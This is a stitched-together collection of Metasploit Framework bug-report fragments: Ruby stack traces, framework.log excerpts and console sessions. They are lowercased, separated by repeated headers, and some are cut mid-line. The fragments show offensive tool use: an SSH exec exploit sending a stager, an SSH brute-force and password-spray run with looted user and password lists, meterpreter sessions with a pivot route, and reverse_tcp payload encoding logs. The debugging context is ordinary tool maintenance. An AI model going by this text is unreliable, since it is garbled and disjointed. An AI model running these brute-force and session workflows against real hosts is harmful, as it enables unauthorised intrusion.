msf5 exploit(multi/browser/java_jre17_provider_skeleton) > set payload windows/mettraceback (most recent call last): 28: from /usr/bin/msfconsole:49:in `<main>' 27: from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start' 26: from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start' 25: from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:134:in `run' 24: from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:309:in `get_input_line' 23: from /usr/share/metasploit-framework/lib/rex/ui/text/input/readline.rb:100:in `pgets' 22: from /usr/share/metasploit-framework/lib/rex/ui/text/input/readline.rb:162:in `readline_with_output' 21: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4875:in `readline' 20: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4853:in `readline_internal' 19: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4779:in `readline_internal_charloop' 18: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4363:in `_rl_dispatch' 17: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4374:in `_rl_dispatch_subseq' 16: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:6903:in `rl_complete' 15: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:6813:in `rl_complete_internal' 14: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:6329:in `gen_completion_matches' 13: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/readline.rb:136:in `readline_attempted_completion_function' 12: from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:62:in `block in init_tab_complete' 11: from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:375:in `tab_complete' 10: from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:390:in `tab_complete_stub' 9: from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:390:in `each' 8: from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:401:in `block in tab_complete_stub' 7: from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:442:in `tab_complete_helper' 6: from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1615:in `cmd_set_tabs' 5: from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:2167:in `tab_complete_option' 4: from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:2304:in `option_values_payloads' 3: from /usr/share/metasploit-framework/lib/msf/core/exploit.rb:775:in `compatible_payloads' 2: from /usr/share/metasploit-framework/lib/msf/core/exploit.rb:775:in `each' 1: from /usr/share/metasploit-framework/lib/msf/core/exploit.rb:776:in `block in compatible_payloads'
/usr/share/metasploit-framework/lib/msf/core/exploit.rb:745:in `is_payload_compatible?': undefined method `cached_size' for nil:nilclass (nomethoderror)
``` ## system stuff
only the 17-010 vuln is stored in the database
## system stuff
not vulnerable hosts are regarded as vulnerable and show on the list
`~/.msf4/logs/framework.log` [07/08/2019 12:16:01] [e(0)] core: eoferror
/opt/metasploit-framework/embedded/lib/ruby/gems/2.5.0/gems/rex-core-0.1.13/lib/rex/io/stream.rb:203:in `get_once'
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb:395:in `rdp_recv'
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb:403:in `rdp_send_recv'
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb:290:in `check_rdp_vuln'
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb:93:in `check_host'
/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb:65:in `run_host'
/opt/metasploit-framework/embedded/framework/lib/msf/core/auxiliary/scanner.rb:111:in `block (2 levels) in run'
/opt/metasploit-framework/embedded/framework/lib/msf/core/thread_manager.rb:106:in `block in spawn' ## system stuff
currently, it looks like `search` doesn't traverse each user's appdata folder
it's not just because it's hidden, either, according to my tests above
if you search appdata explicitly, however, it does recurse as normal
my guess is #l174 isn't traversing appdata somehow..
but i'm not sure
## system stuff
fails to start with following exception: [-] auxiliary failed: nomethoderror undefined method `match' for {:check_empty=>false}:hash [-] call stack: [-] /usr/share/metasploit-framework/lib/msf/core/opt_base.rb:118:in `valid?' [-] /usr/share/metasploit-framework/lib/msf/core/opt_string.rb:34:in `valid?' [-] /usr/share/metasploit-framework/lib/msf/core/option_container.rb:200:in `block in validate' [-] /usr/share/metasploit-framework/lib/msf/core/option_container.rb:199:in `each_pair' [-] /usr/share/metasploit-framework/lib/msf/core/option_container.rb:199:in `validate' ## system stuff linux 4.19.0-kali3-amd64 #1 smp debian 4.19.20-1kali1 (2019-02-14) x86_64 gnu/linux
werfault.exe is spawned and no session is established
## system stuff
about half the time, the attempt hangs and the module fails, requiring the user to ctrl+c: ```
msf5 exploit(multi/ssh/sshexec) > run
d, [2019-06-27t15:04:14.187817 #47829] debug -- net.ssh.transport.session[3ffff297f054]: establishing connection to 127.0.0.1:22 through proxy
d, [2019-06-27t15:04:14.188794 #47829] debug -- net.ssh.transport.session[3ffff297f054]: connection established
i, [2019-06-27t15:04:14.188880 #47829] info -- net.ssh.transport.server_version[3ffff2983d84]: negotiating protocol version
d, [2019-06-27t15:04:14.188922 #47829] debug -- net.ssh.transport.server_version[3ffff2983d84]: local is `ssh-2.0-openssh_7.6p1 ubuntu-4ubuntu0.3'
d, [2019-06-27t15:04:14.194977 #47829] debug -- net.ssh.transport.server_version[3ffff2983d84]: remote is `ssh-2.0-openssh_7.2p2 ubuntu-4ubuntu2.8'
i, [2019-06-27t15:04:14.195542 #47829] info -- net.ssh.transport.algorithms[3ffff2982e20]: sending kexinit
d, [2019-06-27t15:04:14.195756 #47829] debug -- socket[3ffff297e668]: queueing packet nr 0 type 20 len 1324
d, [2019-06-27t15:04:14.195881 #47829] debug -- socket[3ffff297e668]: sent 1328 bytes
d, [2019-06-27t15:04:14.195937 #47829] debug -- socket[3ffff297e668]: read 976 bytes
d, [2019-06-27t15:04:14.196007 #47829] debug -- socket[3ffff297e668]: received packet nr 0 type 20 len 972
i, [2019-06-27t15:04:14.196061 #47829] info -- net.ssh.transport.algorithms[3ffff2982e20]: got kexinit from server
i, [2019-06-27t15:04:14.196119 #47829] info -- net.ssh.transport.algorithms[3ffff2982e20]: negotiating algorithms
d, [2019-06-27t15:04:14.196195 #47829] debug -- net.ssh.transport.algorithms[3ffff2982e20]: negotiated:
* kex: ecdh-sha2-nistp521
* host_key: ecdsa-sha2-nistp256
* encryption_server: aes256-ctr
* encryption_client: aes256-ctr
* hmac_client: hmac-sha2-512
* hmac_server: hmac-sha2-512
* compression_client: none
* compression_server: none
* language_client: * language_server: d, [2019-06-27t15:04:14.196273 #47829] debug -- net.ssh.transport.algorithms[3ffff2982e20]: exchanging keys
d, [2019-06-27t15:04:14.196686 #47829] debug -- socket[3ffff297e668]: queueing packet nr 1 type 30 len 148
d, [2019-06-27t15:04:14.196800 #47829] debug -- socket[3ffff297e668]: sent 152 bytes
d, [2019-06-27t15:04:14.198320 #47829] debug -- socket[3ffff297e668]: read 376 bytes
d, [2019-06-27t15:04:14.198490 #47829] debug -- socket[3ffff297e668]: received packet nr 1 type 31 len 356
d, [2019-06-27t15:04:14.199738 #47829] debug -- socket[3ffff297e668]: queueing packet nr 2 type 21 len 20
d, [2019-06-27t15:04:14.199945 #47829] debug -- socket[3ffff297e668]: sent 24 bytes
d, [2019-06-27t15:04:14.200021 #47829] debug -- socket[3ffff297e668]: received packet nr 2 type 21 len 12
d, [2019-06-27t15:04:14.200305 #47829] debug -- net.ssh.authentication.session[3ffff2998f54]: beginning authentication of `administrator'
d, [2019-06-27t15:04:14.200440 #47829] debug -- socket[3ffff297e668]: queueing packet nr 3 type 5 len 28
d, [2019-06-27t15:04:14.200500 #47829] debug -- socket[3ffff297e668]: sent 96 bytes
d, [2019-06-27t15:04:14.239597 #47829] debug -- socket[3ffff297e668]: read 96 bytes
d, [2019-06-27t15:04:14.239734 #47829] debug -- socket[3ffff297e668]: received packet nr 3 type 6 len 28
d, [2019-06-27t15:04:14.239830 #47829] debug -- net.ssh.authentication.session[3ffff2998f54]: trying password
d, [2019-06-27t15:04:14.239933 #47829] debug -- socket[3ffff297e668]: queueing packet nr 4 type 50 len 76
d, [2019-06-27t15:04:14.240032 #47829] debug -- socket[3ffff297e668]: sent 144 bytes
d, [2019-06-27t15:04:14.249052 #47829] debug -- socket[3ffff297e668]: read 80 bytes
d, [2019-06-27t15:04:14.249263 #47829] debug -- socket[3ffff297e668]: received packet nr 4 type 52 len 12
d, [2019-06-27t15:04:14.249348 #47829] debug -- net.ssh.authentication.methods.password[3ffff299d52c]: password succeeded [*] 127.0.0.1:22 - sending stager...
d, [2019-06-27t15:04:14.250297 #47829] debug -- socket[3ffff297e668]: queueing packet nr 5 type 90 len 44
d, [2019-06-27t15:04:14.250520 #47829] debug -- socket[3ffff297e668]: sent 112 bytes
d, [2019-06-27t15:04:14.348505 #47829] debug -- socket[3ffff297e668]: read 992 bytes
d, [2019-06-27t15:04:14.348735 #47829] debug -- socket[3ffff297e668]: received packet nr 5 type 80 len 924
i, [2019-06-27t15:04:14.348925 #47829] info -- net.ssh.connection.session[3ffff29a1b7c]: global request received: hostkeys-00@openssh.com false
d, [2019-06-27t15:04:14.387086 #47829] debug -- socket[3ffff297e668]: read 96 bytes
d, [2019-06-27t15:04:14.387257 #47829] debug -- socket[3ffff297e668]: received packet nr 6 type 91 len 28
i, [2019-06-27t15:04:14.387313 #47829] info -- net.ssh.connection.session[3ffff29a1b7c]: channel_open_confirmation: 0 0 0 32768
i, [2019-06-27t15:04:14.387375 #47829] info -- net.ssh.connection.channel[3ffff29be8d0]: sending channel request "exec"
d, [2019-06-27t15:04:14.387474 #47829] debug -- socket[3ffff297e668]: queueing packet nr 6 type 98 len 140
d, [2019-06-27t15:04:14.387568 #47829] debug -- socket[3ffff297e668]: sent 208 bytes
d, [2019-06-27t15:04:14.388172 #47829] debug -- socket[3ffff297e668]: read 176 bytes
d, [2019-06-27t15:04:14.388271 #47829] debug -- socket[3ffff297e668]: received packet nr 7 type 93 len 28
i, [2019-06-27t15:04:14.388324 #47829] info -- net.ssh.connection.session[3ffff29a1b7c]: channel_window_adjust: 0 +2097152
d, [2019-06-27t15:04:14.388387 #47829] debug -- socket[3ffff297e668]: received packet nr 8 type 99 len 12
i, [2019-06-27t15:04:14.388432 #47829] info -- net.ssh.connection.session[3ffff29a1b7c]: channel_success: 0
`[insert ~5 second delay, and then...]`
[-] ssh timeout exception will say the exploit failed; do not believe it.
[+] you will likely still get a shell; run sessions -l to be sure.
i, [2019-06-27t15:04:19.262543 #47829] info -- net.ssh.connection.session[3ffff29a1b7c]: closing remaining channels (1 open)
d, [2019-06-27t15:04:19.262826 #47829] debug -- socket[3ffff297e668]: queueing packet nr 7 type 97 len 28
d, [2019-06-27t15:04:19.262974 #47829] debug -- socket[3ffff297e668]: sent 96 bytes
``` there are no stack traces in `~/.msf4/logs/framework.log`, and the only errors are reflective of the user ctrl+c'ing the failed attempt
## system stuff
### actual output (brief):
[-] 192.168.52.20:22 - failed: 'user1:password1'
[-] 192.168.52.20:22 - failed: 'user1:password2'
[-] 192.168.52.20:22 - failed: 'user1:password3'
[-] 192.168.52.20:22 - failed: 'user1:password4'
[-] 192.168.52.20:22 - failed: 'user1:password5'
### actual output (long):
msf5 auxiliary(scanner/ssh/ssh_login) > sessions active sessions
=============== id name type information connection -- ---- ---- ----------- ---------- 1 meterpreter x64/linux uid=1096, gid=100, euid=1096, egid=100 @ host 192.168.34.53:22 -> 192.168.35.105:37852 (192.168.35.105) msf5 auxiliary(scanner/ssh/ssh_login) > route ipv4 active routing table
========================= subnet netmask gateway ------ ------- ------- 192.168.52.0 255.255.255.0 session 1 [*] there are currently no ipv6 routes defined.
msf5 auxiliary(scanner/ssh/ssh_login) > options module options (auxiliary/scanner/ssh/ssh_login): name current setting required description ---- --------------- -------- ----------- blank_passwords false no try blank passwords for all users bruteforce_speed 5 yes how fast to bruteforce, from 0 to 5 db_all_creds false no try each user/password couple stored in the current database db_all_pass false no add all passwords in the current database to the list db_all_users false no add all users in the current database to the list password no a specific password to authenticate with pass_file /root/loot/passwords.txt no file containing passwords, one per line rhosts 192.168.52.20 yes the target address range or cidr identifier rport 22 yes the target port stop_on_success false yes stop guessing when a credential works for a host threads 1 yes the number of concurrent threads username no a specific username to authenticate as userpass_file no file containing users and passwords separated by space, one pair per line user_as_pass true no try the username as the password for all users user_file /root/loot/users.txt no file containing usernames, one per line verbose true yes whether to print output for all attempts msf5 auxiliary(scanner/ssh/ssh_login) > advanced module advanced options (auxiliary/scanner/ssh/ssh_login): name current setting required description ---- --------------- -------- ----------- autorunscript no a script to run automatically on session creation
commandshellcleanupcommand no a command to run before the session is closed createsession false no create a new session for every successful login initialautorunscript no an initial script to run on session creation (before autorunscript) maxguessesperservice 0 no maximum number of credentials to try per service instance
if set to zero or a non-number, this option will not be used
maxguessesperuser 0 no maximum guesses for a particular username for the service instance
note that users are considered unique among different services, so a user at 10.1.1.1:22 is different from one at 10.2.2.2:22, and both will be tried up to the maxguessesperuser limit
if set to zero or a non-number, this option will not be used
maxminutesperservice 0 no maximum time in minutes to bruteforce the service instance
if set to zero or a non-number, this option will not be used
password_spray true yes reverse the credential pairing order
for each password, attempt every possible user
proxies no a proxy chain of format type:host:port[,type:host:port][...] remove_pass_file false yes automatically delete the pass_file on module completion remove_userpass_file false yes automatically delete the userpass_file on module completion remove_user_file false yes automatically delete the user_file on module completion ssh_debug false no enable ssh debugging output (extreme verbosity!) ssh_ident ssh-2.0-openssh_7.6p1 ubuntu-4ubuntu0.3 yes ssh client identification string ssh_timeout 30 no specify the maximum time to negotiate a ssh session showprogress true yes display progress messages during a scan showprogresspercent 10 yes the interval in percent that progress should be shown transition_delay 9 no amount of time (in minutes) to delay before transitioning to the next user in the array (or password when password_spray=true) workspace msf5 auxiliary(scanner/ssh/ssh_login) > run -j
[*] auxiliary module running as background job 2.
msf5 auxiliary(scanner/ssh/ssh_login) > [-] 192.168.52.20:22 - could not connect: execution expired
[-] 192.168.52.20:22 - failed: 'asxxxxxx:password1'
[-] 192.168.52.20:22 - failed: 'asxxxxxx:password2'
[-] 192.168.52.20:22 - failed: 'asxxxxxx:password3'
[-] 192.168.52.20:22 - failed: 'asxxxxxx:password4'
[-] 192.168.52.20:22 - failed: 'asxxxxxx:password5'
[-] 192.168.52.20:22 - failed: 'asxxxxxx:password6'
``` ## system stuff
commands are not capture in the spool file for the linux shell; however, the output of the commands are present
## system stuff
meterpreter > pwd
meterpreter > screenshare
[*] preparing player...
[*] opening player at: /metasploit-framework/alkhxycw.html
[*] streaming...
opening in existing browser session.
[-] error running command screenshare: rex::timeouterror operation timed out.
meterpreter >
meterpreter > pwd
meterpreter > screenshot
[-] error running command screenshot: rex::timeouterror operation timed out.
meterpreter > pwd
``` potentially there is also a memory leak, as task manager shows the process slowly eating up memory
it's interesting that the meterpreter session remains active after the screenshot begins to fail.
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces the meterpreter sessions just hangs and i eventually issued a ctrl +c
i later issued a `execute -f cmd.exe` that does spawn a cmd.exe window on the vm indicating the commands are received
this might be unrelated, but the named pipe session died on its own after being up roughly 30 minutes
i briefly spoke with @oj about this in the community slack channel ## system stuff
the import calling code results in an error
this can be seen in the `~/.msf4/logs/framework.log` log file
[06/17/2019 16:52:21] [e(0)] core: problem generating db import: undefined method `import' for #<metasploit::framework::dataservice::remotehttpdataservice: >
did you mean? import_file
[06/17/2019 16:52:21] [e(0)] core: /home/msfdev/metasploit-framework/lib/metasploit/framework/data_service/proxy/db_import_data_proxy.rb:6:in `block in import'
[06/17/2019 16:52:21] [e(0)] core: /home/msfdev/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:166:in `data_service_operation'
[06/17/2019 16:52:21] [e(0)] core: /home/msfdev/metasploit-framework/lib/metasploit/framework/data_service/proxy/db_import_data_proxy.rb:4:in `import'
[06/17/2019 16:52:21] [e(0)] core: /home/msfdev/metasploit-framework/plugins/openvas.rb:530:in `cmd_openvas_report_import'
[06/17/2019 16:52:21] [e(0)] core: /home/msfdev/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
[06/17/2019 16:52:21] [e(0)] core: /home/msfdev/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
[06/17/2019 16:52:21] [e(0)] core: /home/msfdev/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
[06/17/2019 16:52:21] [e(0)] core: /home/msfdev/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
[06/17/2019 16:52:21] [e(0)] core: /home/msfdev/metasploit-framework/lib/rex/ui/text/shell.rb:151:in `run'
[06/17/2019 16:52:21] [e(0)] core: /home/msfdev/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
[06/17/2019 16:52:21] [e(0)] core: /home/msfdev/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
[06/17/2019 16:52:21] [e(0)] core: ./msfconsole:49:in `<main>'
``` ## system stuff
(last error in log file)** [e(0)] core: windows/meterpreter/reverse_tcp: iteration 1: broken encoder x86/xor_dynamic: bad character found in stub for the dynamic key xor encoder encoder
[e(0)] core: windows/meterpreter/reverse_tcp: iteration 1: broken encoder x86/fnstenv_mov: no valid set instruction could be created! [i(0)] core: windows/meterpreter/reverse_tcp: iteration 1: successfully encoded with encoder x86/call4_dword_xor (size is 392) [e(0)] core: exploit failed (windows/http/badblue_passthru): nomethoderror undefined method `get_service' for #<metasploit::framework::dataservice::remotehttpdataservi$
did you mean? get_msf_version **
no shell session, instead following error: stdapi_sys_config_getenv: operation failed: 1** here is `~/.msf4/logs/framework.log`:
/usr/bin/msfconsole:49:in `<main>'
[06/13/2019 12:52:54] [e(0)] core: unable to load module /usr/share/metasploit-framework/modules/auxiliary/scanner/msmail/onprem_enum.go errno::enoent no such file or directory - go /usr/lib/ruby/2.5.0/open3.rb:199:in `spawn'
/usr/lib/ruby/2.5.0/open3.rb:199:in `popen_run'
/usr/lib/ruby/2.5.0/open3.rb:95:in `popen3'
/usr/share/metasploit-framework/lib/msf/core/modules/external/bridge.rb:62:in `send'
/usr/share/metasploit-framework/lib/msf/core/modules/external/bridge.rb:18:in `exec'
/usr/share/metasploit-framework/lib/msf/core/modules/external.rb:25:in `exec'
/usr/share/metasploit-framework/lib/msf/core/modules/external.rb:47:in `describe'
/usr/share/metasploit-framework/lib/msf/core/modules/external.rb:13:in `meta'
/usr/share/metasploit-framework/lib/msf/core/modules/external/shim.rb:7:in `generate'
/usr/share/metasploit-framework/lib/msf/core/modules/loader/executable.rb:88:in `read_module_content'
/usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:127:in `load_module'
/usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:246:in `block in load_modules'
/usr/share/metasploit-framework/lib/msf/core/modules/loader/executable.rb:53:in `block (2 levels) in each_module_reference_name'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/file.rb:133:in `block in find'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/file.rb:132:in `catch'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/file.rb:132:in `find'
/usr/share/metasploit-framework/lib/msf/core/modules/loader/executable.rb:42:in `block in each_module_reference_name'
/usr/share/metasploit-framework/lib/msf/core/modules/loader/executable.rb:31:in `foreach'
/usr/share/metasploit-framework/lib/msf/core/modules/loader/executable.rb:31:in `each_module_reference_name'
/usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:245:in `load_modules'
/usr/share/metasploit-framework/lib/msf/core/module_manager/loading.rb:119:in `block in load_modules'
/usr/share/metasploit-framework/lib/msf/core/module_manager/loading.rb:117:in `each'
/usr/share/metasploit-framework/lib/msf/core/module_manager/loading.rb:117:in `load_modules'
/usr/share/metasploit-framework/lib/msf/core/module_manager/module_paths.rb:41:in `block in add_module_path'
/usr/share/metasploit-framework/lib/msf/core/module_manager/module_paths.rb:40:in `each'
/usr/share/metasploit-framework/lib/msf/core/module_manager/module_paths.rb:40:in `add_module_path'
/usr/share/metasploit-framework/lib/msf/base/simple/framework/module_paths.rb:50:in `block in init_module_paths'
/usr/share/metasploit-framework/lib/msf/base/simple/framework/module_paths.rb:49:in `each'
/usr/share/metasploit-framework/lib/msf/base/simple/framework/module_paths.rb:49:in `init_module_paths'
/usr/share/metasploit-framework/lib/msf/ui/console/driver.rb:161:in `initialize'
/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:62:in `new'
/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:62:in `driver'
/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
/usr/bin/msfconsole:49:in `<main>'
[06/13/2019 12:53:03] [e(0)] meterpreter: stdapi_sys_config_getenv: operation failed: 1
[06/13/2019 12:53:03] [d(0)] meterpreter: call stack:
/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb:84:in `getenvs'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb:100:in `getenv'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/sys.rb:326:in `cmd_shell'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:105:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:68:in `block in interact'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:146:in `run'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:66:in `interact'
/usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:575:in `_interact'
/usr/share/metasploit-framework/lib/rex/ui/interactive.rb:51:in `interact'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1363:in `cmd_sessions'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:151:in `run'
/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
/usr/bin/msfconsole:49:in `<main>'
tests fail with:
[*] setup: changing working directory to %temp%
[*] running against session 1
[*] session type is meterpreter and platform is windows
[-] failed: should test for file existence
[+] should test for directory existence
[+] should create text files
[+] should read the text we just wrote
[+] should append text files
[+] should delete text files
[+] should move files
[*] writing 31376 bytes
[*] finished in 0.125068923
[+] should write binary data
[*] read 31376 bytes
[+] should read the binary data we just wrote
[+] should delete binary files
[+] should append binary data
[*] testing complete in 3.999792465
[-] passed: 10; failed: 1 ```
the reason behind this may be related to the new stat functionality
uynderlying the file? method is the session.fs.file.stat method.
when you call the fs.file.stat method on the two existing files listed in the test ("c:\\\\boot.ini" and "c:\\\\pagefile.sys") you get:
[-] post failed: rex::post::meterpreter::requesterror stdapi_fs_stat: operation failed: the process cannot access the file because it is being used by another process.
i assume that this used to be ok, but now we are rescuing the error differently or using stat differently
a trivial workaround is to add "%windir%\\\\system32\\\ otepad.exe" to the file list and hope it is not open
when you do that, it works:
msf5 post(test/file) > run [*] setup: changing working directory to %temp%
[*] running against session 1
[*] session type is meterpreter and platform is windows
[+] should test for file existence
[+] should test for directory existence
[+] should create text files
[+] should read the text we just wrote
[+] should append text files
[+] should delete text files
[+] should move files
[*] writing 31376 bytes
[*] finished in 0.124017357
[+] should write binary data
[*] read 31376 bytes
[+] should read the binary data we just wrote
[+] should delete binary files
[+] should append binary data
[*] testing complete in 4.077156385
[*] passed: 11; failed: 0
[*] cleanup: changing working directory back to c:\\windows\\system32
[*] post module execution completed ```
job stays, no death
## system stuff
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
auxiliary module execution completed
nothing happens on the chromecast/tv ## system stuff
kali gnu/linux rolling
update && upgrade before exploit
android app crashes
meterpreter session closes
> [*] importing report to database.
> [-] error while running command openvas_report_import: problem generating db import: opts must include a valid :workspace
see log for more details
> > call stack:
> /usr/share/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:174:in `log_error'
> /usr/share/metasploit-framework/lib/metasploit/framework/data_service/proxy/db_import_data_proxy.rb:9:in `rescue in import'
> /usr/share/metasploit-framework/lib/metasploit/framework/data_service/proxy/db_import_data_proxy.rb:2:in `import'
> /usr/share/metasploit-framework/plugins/openvas.rb:528:in `cmd_openvas_report_import'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
> /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:151:in `run'
> /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
> /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
> /usr/bin/msfconsole:49:in `<main>' > you might also want to check the last ~1k lines of
> `/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
> `~/.msf4/logs/framework.log` for relevant stack traces
> [05/18/2019 13:34:42] [e(0)] core: problem generating db import: opts must include a valid :workspace
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/lib/msf/util/db_manager.rb:37:in `process_opts_workspace'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/lib/msf/core/db_manager/service.rb:66:in `block in report_service'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/activerecord-4.2.11.1/lib/active_record/connection_adapters/abstract/connection_pool.rb:292:in `with_connection'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/lib/msf/core/db_manager/service.rb:61:in `report_service'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/lib/rex/parser/nokogiri_doc_mixin.rb:151:in `db_report'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/lib/rex/parser/openvas_nokogiri.rb:166:in `record_service'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/lib/rex/parser/openvas_nokogiri.rb:105:in `end_element'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/nokogiri-1.10.3/lib/nokogiri/xml/sax/document.rb:127:in `end_element_namespace'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/nokogiri-1.10.3/lib/nokogiri/xml/sax/parser.rb:110:in `parse_with'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/nokogiri-1.10.3/lib/nokogiri/xml/sax/parser.rb:110:in `parse_memory'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/nokogiri-1.10.3/lib/nokogiri/xml/sax/parser.rb:83:in `parse'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/lib/msf/core/db_manager/import/open_vas.rb:11:in `import_openvas_new_xml'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/lib/msf/core/db_manager/import.rb:97:in `import'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/lib/metasploit/framework/data_service/proxy/db_import_data_proxy.rb:6:in `block in import'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:166:in `data_service_operation'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/lib/metasploit/framework/data_service/proxy/db_import_data_proxy.rb:4:in `import'
